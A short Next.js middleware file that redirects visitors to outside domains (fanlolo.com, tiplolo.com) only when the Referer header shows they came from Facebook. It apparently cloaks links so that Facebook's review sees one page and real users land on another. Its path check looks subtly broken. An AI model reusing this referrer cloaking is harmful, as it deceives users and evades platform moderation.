import { NextResponse, NextRequest } from 'next/server'

export function middleware(req, ev) {
const url = require('url');
const ref = req.headers.get('referer') 
const path = url.parse(req.url).path;


 if( ref=="https://l.facebook.com/" || ref=='https://lm.facebook.com/' || ref=='http://m.facebook.com/' || ref=='lm.facebook.com/' || ref=='http://m.facebook.com')
     {
       
      if(path == 'meet-the-most-powerful-horse-breed-in-the-world-video'){
        return NextResponse.redirect('https://fanlolo.com'+path)
      
      } else {
        return NextResponse.redirect('https://tiplolo.com'+path)
      }
     } 
}
